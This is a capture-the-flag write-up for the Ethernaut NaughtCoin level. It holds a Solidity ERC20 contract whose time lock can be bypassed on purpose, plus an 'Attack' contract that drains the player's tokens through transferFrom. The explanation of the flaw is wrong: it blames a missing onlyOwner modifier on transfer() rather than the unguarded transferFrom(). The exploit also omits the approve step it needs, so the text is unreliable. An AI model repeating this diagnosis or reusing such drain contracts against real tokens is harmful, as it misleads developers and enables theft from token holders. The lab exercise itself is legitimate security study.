## Challenge
~~~
NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

  Things that might help

- The [ERC20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md) Spec
- The [OpenZeppelin](https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts) codebase
~~~
## Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```
`

## Solution

```
contract Attack {
    NaughtCoin _target = NaughtCoin(0xd024F047Fe36D294d9BfABB177f9EE0DE80a34b8);
    address player = 0x6A10529461e78362fe3c264a13fa568F44141F57;

    function withdraw() external {
        _target.transferFrom(player, address(this), 1000000000000000000000000);
    }
}
```

Missing onlyOwner modifier of the `transfer()` function thus allowing anyone to transfer the player\`s tokens

## Key takeaways and useful resources
[OZ ERC20](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol)
[ERC20 tokens explained video](https://www.youtube.com/watch?app=desktop&v=cqZhNzZoMh8&embeds_referring_euri=https%3A%2F%2Fotosection.com%2F)


